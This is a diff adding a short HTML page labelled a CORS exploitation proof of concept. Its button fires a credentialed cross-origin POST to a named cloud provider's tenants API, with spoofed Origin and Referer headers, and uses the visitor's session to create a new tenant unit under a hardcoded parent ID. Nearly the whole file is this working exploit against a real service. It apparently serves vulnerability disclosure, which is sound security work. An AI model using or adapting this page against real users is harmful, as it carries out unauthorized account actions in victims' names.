@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h1>CORS Exploitation PoC</h1>
+    <button id="sendRequest">Send Malicious Request</button>
+
+    <script>
+        document.getElementById('sendRequest').addEventListener('click', () => {
+            fetch('https://eu2-cloud.acronis.com/api/2/tenants', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Acronis-Api': '1',
+                    'Sec-Ch-Ua-Platform': '"Windows"',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+                    'Origin': 'https://testeu2-cloud.acronis.com',
+                    'Referer': 'https://eu2-cloud.acronis.com/mc/app;group_id=8ceb0790-f96d-45a9-b172-fb6f2b93fb30/clients/new;created_tenant_kind=50',
+                },
+                body: JSON.stringify({
+                    "parent_id": "8ceb0790-f96d-45a9-b172-fb6f2b93fb30",
+                    "kind": "unit",
+                    "contact": {
+                        "email": "ttwaeasdasy@sdhskaj.com",
+                        "firstname": "dajsd",
+                        "lastname": "dasdasd",
+                        "phone": null,
+                        "title": null,
+                        "types": null,
+                        "country": "EG",
+                        "industry": ""
+                    },
+                    "name": "sadsdadasdssd",
+                    "language": "en"
+                }),
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Response:', data);
+                alert('Request sent! Check the console for the response.');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Request failed! Check the console for errors.');
+            });
+        });
+    </script>
+</body>
+</html>
